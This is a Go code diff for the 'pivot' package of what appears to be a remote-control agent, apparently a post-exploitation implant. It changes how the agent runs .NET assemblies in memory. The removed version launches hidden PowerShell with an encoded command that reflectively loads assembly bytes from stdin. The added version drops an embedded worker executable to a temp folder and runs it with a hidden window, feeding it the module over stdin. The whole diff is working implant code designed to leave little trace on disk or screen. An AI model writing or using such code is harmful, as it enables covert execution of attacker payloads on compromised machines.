@@ -5,8 +5,8 @@ package pivot
 import (
 	"bytes"
 	"context"
-	"encoding/base64"
-	"encoding/json"
+	_ "embed"
+	"encoding/binary"
 	"errors"
 	"fmt"
 	"io"
@@ -16,51 +16,41 @@ import (
 	"sync"
 	"sync/atomic"
 	"syscall"
-	"unicode/utf16"
+	"time"
 )
 
-// Windows PowerShell 5.1 hosts the installed .NET Framework CLR. The assembly
-// bytes arrive on stdin; neither the assembly nor a generated script is written
-// to the agent filesystem. The process is short lived and killed on cancellation.
-const assemblyHost = `$ErrorActionPreference='Stop'
-$ProgressPreference='SilentlyContinue'
-try {
-  $utf8=New-Object System.Text.UTF8Encoding($false)
-  [Console]::InputEncoding=$utf8
-  [Console]::OutputEncoding=$utf8
-  $stdout=[System.IO.StreamWriter]::new([Console]::OpenStandardOutput(),$utf8,4096)
-  $stdout.AutoFlush=$true
-  [Console]::SetOut($stdout)
-  $stderr=[System.IO.StreamWriter]::new([Console]::OpenStandardError(),$utf8,4096)
-  $stderr.AutoFlush=$true
-  [Console]::SetError($stderr)
-  $request=[Console]::In.ReadToEnd() | ConvertFrom-Json
-  $assembly=[Reflection.Assembly]::Load([Convert]::FromBase64String($request.source))
-  $entry=$assembly.EntryPoint
-  if ($null -eq $entry) {
-    $flags=[Reflection.BindingFlags]::Static -bor [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::NonPublic
-    $entries=@($assembly.GetTypes() | ForEach-Object { $_.GetMethods($flags) | Where-Object { $_.Name -eq 'Main' } })
-    if ($entries.Count -ne 1) { throw 'Assembly DLL requires exactly one static Main method' }
-    $entry=$entries[0]
-  }
-  $parameters=$entry.GetParameters()
-  if ($parameters.Length -eq 0) { $invoke=@() }
-  elseif ($parameters.Length -eq 1 -and $parameters[0].ParameterType -eq [string[]]) {
-    $invoke=New-Object 'object[]' 1
-    if ($null -eq $request.args) { $invoke[0]=[string[]]@() }
-    else { $invoke[0]=[string[]]@($request.args) }
-  } else { throw 'Assembly entry point must be Main() or Main(string[] args)' }
-  $result=$entry.Invoke($null,$invoke)
-  if ($result -is [System.Threading.Tasks.Task]) {
-    $result.GetAwaiter().GetResult() | Out-Null
-    if ($result.GetType().IsGenericType) { $result=$result.Result } else { $result=$null }
-  }
-  if ($result -is [int]) { exit $result }
-  exit 0
-} catch {
-  [Console]::Error.WriteLine($_.Exception.ToString())
-  exit 1
-}`
+//go:embed assemblyworker/worker.exe
+var assemblyWorker []byte
+
+// The dedicated .NET Framework worker is embedded in the agent binary. Only
+// this fixed worker executable is materialized for CreateProcess; the module
+// itself is sent over stdin and loaded by the CLR from bytes.
+func assemblyWorkerPath() (string, func(), error) {
+	directory, err := os.MkdirTemp("", "undertow-clr-")
+	if err != nil {
+		return "", nil, fmt.Errorf("create assembly worker directory: %w", err)
+	}
+	cleanup := func() { _ = os.RemoveAll(directory) }
+	path := filepath.Join(directory, "worker.exe")
+	if err := os.WriteFile(path, assemblyWorker, 0700); err != nil {
+		cleanup()
+		return "", nil, fmt.Errorf("write assembly worker: %w", err)
+	}
+	return path, cleanup, nil
+}
+
+func assemblyWorkerRequest(source []byte, args []string) []byte {
+	request := bytes.NewBuffer(make([]byte, 0, 12+len(source)+4096))
+	request.WriteString("UTA1")
+	_ = binary.Write(request, binary.LittleEndian, uint32(len(args)))
+	for _, arg := range args {
+		_ = binary.Write(request, binary.LittleEndian, uint32(len(arg)))
+		request.WriteString(arg)
+	}
+	_ = binary.Write(request, binary.LittleEndian, uint32(len(source)))
+	request.Write(source)
+	return request.Bytes()
+}
 
 type assemblyOutput struct {
 	kind      byte
@@ -87,26 +77,15 @@ func (o assemblyOutput) Write(data []byte) (int, error) {
 }
 
 func executeAssembly(ctx context.Context, source []byte, args []string, write func(byte, []byte) error) (int, error) {
-	root := os.Getenv("SystemRoot")
-	if root == "" {
-		root = `C:\Windows`
-	}
-	path := filepath.Join(root, "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
-	units := utf16.Encode([]rune(assemblyHost))
-	encoded := make([]byte, len(units)*2)
-	for i, unit := range units {
-		encoded[2*i], encoded[2*i+1] = byte(unit), byte(unit>>8)
-	}
-	input, err := json.Marshal(struct {
-		Source []byte   `json:"source"`
-		Args   []string `json:"args"`
-	}{Source: source, Args: args})
+	path, cleanup, err := assemblyWorkerPath()
 	if err != nil {
 		return -1, err
 	}
-	command := exec.CommandContext(ctx, path, "-NoLogo", "-NoProfile", "-NonInteractive", "-EncodedCommand", base64.StdEncoding.EncodeToString(encoded))
+	defer cleanup()
+
+	command := exec.CommandContext(ctx, path)
 	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	command.Stdin = bytes.NewReader(input)
+	command.Stdin = bytes.NewReader(assemblyWorkerRequest(source, args))
 	stdout, err := command.StdoutPipe()
 	if err != nil {
 		return -1, err
@@ -147,6 +126,10 @@ func executeAssembly(ctx context.Context, source []byte, args []string, write fu
 	select {
 	case <-ctx.Done():
 		_ = command.Process.Kill()
+		select {
+		case <-done:
+		case <-time.After(5 * time.Second):
+		}
 		return -1, ctx.Err()
 	case waitErr = <-done:
 	}
